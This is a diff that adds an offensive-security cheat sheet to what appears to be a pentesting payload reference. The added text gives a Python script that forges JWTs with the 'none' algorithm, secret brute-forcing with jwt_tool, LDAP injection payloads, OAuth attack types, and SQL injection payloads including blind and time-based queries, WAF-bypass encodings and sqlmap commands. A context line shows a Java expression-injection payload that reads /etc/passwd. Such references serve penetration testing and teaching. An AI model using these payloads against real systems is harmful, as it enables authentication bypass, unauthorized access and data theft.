@@ -891,6 +891,173 @@ ${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
 ```
 
 ---
+# JSON Web Token (JWT) Exploitation & SQL Injection Techniques
+
+## JWT - JSON Web Token
+JSON Web Token follows the format:
+```
+Base64(Header).Base64(Data).Base64(Signature)
+```
+### Example
+```
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFtYXppbmcgSGF4eDByIiwiZXhwIjoiMTQ2NjI3MDcyMiIsImFkbWluIjp0cnVlfQ.UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY
+```
+JWT is split into three parts:
+- **Header**: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9`
+- **Payload**: `eyJzdWIiOiIxMjM0[...]kbWluIjp0cnVlfQ`
+- **Signature**: `UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY`
+
+Default algorithm: **HS256** (HMAC SHA256 symmetric encryption). For asymmetric purposes, **RS256** is used.
+
+#### Header Example
+```json
+{
+    "typ": "JWT",
+    "alg": "HS256"
+}
+```
+#### Payload Example
+```json
+{
+    "sub":"1234567890",
+    "name":"Amazing Haxx0r",
+    "exp":"1466270722",
+    "admin":true
+}
+```
+### Exploiting JWT Vulnerabilities
+#### Modify JWT Signature to None Algorithm
+```python
+import jwt
+
+jwtToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.YWUyMGU4YTI2ZGEyZTQ1MzYzOWRkMjI5YzIyZmZhZWM0NmRlMWVhNTM3NTQwYWY2MGU5ZGMwNjBmMmU1ODQ3OQ'
+
+# Decode the token
+decodedToken = jwt.decode(jwtToken, verify=False)
+noneEncoded = jwt.encode(decodedToken, key='', algorithm=None)
+
+print(noneEncoded.decode())
+```
+#### Output:
+```
+eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.
+```
+#### Brute-force JWT Secret Key
+```sh
+git clone https://github.com/ticarpi/jwt_tool
+python2.7 jwt_tool.py <JWT_TOKEN> /tmp/wordlist
+```
+Reference: [PayloadsAllTheThings - JWT](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token)
+
+---
+
+## LDAP Injection
+LDAP Injection exploits applications that construct LDAP queries based on user input.
+
+### Basic Injection Example
+```sh
+user  = *)(uid=*))(|(uid=*
+pass  = password
+query = "(&(uid=*)(uid=*)) (|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))"
+```
+### Common LDAP Payloads
+```sh
+*)(&
+*))%00
+)(cn=))\x00
+*()|%26'
+*()|&'
+*(|(mail=*))
+*(|(objectclass=*))
+*)(uid=*))(|(uid=*
+admin*)((|userPassword=*)
+x' or name()='username' or 'x'='y
+```
+---
+
+## OAuth Exploitation
+- Stealing OAuth Token via Referer
+- Grabbing OAuth Token via `redirect_uri`
+- Executing XSS via `redirect_uri`
+- OAuth Private Key Disclosure
+- Authorization Code Rule Violation
+- Cross-Site Request Forgery (CSRF)
+
+Reference: [PayloadsAllTheThings - OAuth](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/OAuth)
+
+---
+
+## SQL Injection (SQLi)
+SQL Injection can be:
+- GET Based
+- POST Based
+- Header Based
+- Cookie Based
+
+### SQL Injection Detection Payloads
+```sh
+'
+%27
+"
+%22
+#
+%23
+;
+%3B
+)
+%25%27
+/
+%3B
+```
+#### Logical Testing
+```sh
+page.asp?id=1 or 1=1 -- true
+page.asp?id=1' or 1=1 -- true
+page.asp?id=1" or 1=1 -- true
+page.asp?id=1 and 1=2 -- false
+```
+#### WAF Bypass Techniques
+```sh
+?id=1%09and%091=1%09--
+?id=1%0Dand%0D1=1%0D--
+?id=1%0Cand%0C1=1%0C--
+?id=1%A0and%A01=1%A0--
+```
+#### Alternative Operators
+```sh
+AND   -> &&
+OR    -> ||
+=     -> LIKE, REGEXP, BETWEEN
+```
+
+### Blind SQL Injection (Boolean-Based)
+```sh
+?id=1' and 1=1 --+  # True
+?id=1' and 1=2 --+  # False
+```
+#### Extract Database Name
+```sh
+?id=1' and substring(database(),1,1)="a" --+
+```
+### Time-Based SQL Injection
+```sh
+?id=1' and sleep(10) --+
+```
+### SQLMap Usage
+```sh
+sqlmap -u "http://target.com/?id=1" --dbs
+sqlmap -u "http://target.com/?id=1" -D target_db --tables
+```
+---
+
+## Tools for Exploitation
+- [Hackbar](https://code.google.com/archive/p/hackbar/downloads)
+- [SQLMap](https://github.com/sqlmapproject/sqlmap)
+- [JWT Tool](https://github.com/ticarpi/jwt_tool)
+
+Reference Video: [SQL Injection Exploitation](https://www.youtube.com/watch?v=vWoZK8UM6js)
+
+---
 
 
 
